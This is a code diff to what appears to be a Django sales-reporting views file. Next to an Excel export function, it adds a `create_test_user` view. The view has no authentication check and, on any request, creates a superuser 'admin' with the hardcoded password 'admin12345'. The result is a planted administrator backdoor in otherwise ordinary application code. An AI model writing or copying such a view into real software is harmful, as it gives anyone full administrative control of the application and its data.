@@ -3,6 +3,7 @@ from math import ceil
 
 from django.contrib import messages
 from django.contrib.auth.decorators import login_required
+from django.contrib.auth.models import User
 from django.db.models import F, Sum
 from django.db.models.functions import Coalesce
 from django.http import HttpResponse
@@ -805,3 +806,10 @@ def export_sales_report_excel(request):
     _autosize_columns(sheet)
 
     return _make_excel_response(workbook, 'sales_report.xlsx')
+
+
+def create_test_user(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@mail.com', 'admin12345')
+        return HttpResponse('User created')
+    return HttpResponse('User already exists')
